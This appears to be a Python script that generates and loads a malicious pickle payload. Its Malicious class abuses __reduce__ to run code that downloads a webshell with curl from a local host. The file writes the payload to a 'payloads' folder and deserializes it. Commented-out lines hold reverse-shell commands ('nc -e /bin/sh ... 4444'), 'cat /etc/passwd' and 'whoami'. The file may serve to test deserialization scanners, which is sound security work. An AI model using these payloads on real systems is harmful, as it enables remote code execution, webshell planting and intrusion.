import pickle
import os
import torch

import sys
#
# import open_r1.configs


from collections import OrderedDict

# xxsubtype.run("ls -l")

from external import dangerous_func
from slutterprime import digest
#
# status = open_r1.configs.SFTConfig("ls -l")

# ey.shell("nc -e /bin/sh 127.0.0.1 4444")
# llmexec("import pty; pty.spawn('ls')")

# exit()
#
# p = Processor("info.log")

# p.process("whoami")

# stdout = p.processGetStdOut("nc -e /bin/sh 127.0.0.1 4444")

# for line in stdout.readlines():
# print(line)

# exit()
# def big_bad(bruh):

#     print("hello_world")
#
#
#
#
# execute_code(big_bad, "whoami", proc_=1)
# local.execute("nc -e /bin/sh 127.0.0.1 4444", shell=True)
# local.execute("nc -e /bin/sh 127.0.0.1 4444")

#
# class Malicious:
#     def __reduce__(self):
#         return (
#             local.execute,
#             ("nc -e /bin/sh 127.0.0.1 4444", "shell=True"),
#         )


#

# exit()


class Malicious:
    def __reduce__(self):
        return (
            dangerous_func,
            (
                """import os
os.system('curl http://0.0.0.0:4444/ -o webshell.php')""",
                #                 """import os
                # os.system("cat /etc/passwd")""",
            ),  # arguments to pass to it
        )


payload = pickle.dumps(Malicious(), protocol=2)
# exit()

with open("./payloads/external/system_curl.pkl", "wb") as f:
    f.write(payload)

print("loading")
# sys.path.append("./external.py")
with open("./payloads/external/system_curl.pkl", "rb") as f:
    pickle.load(f)
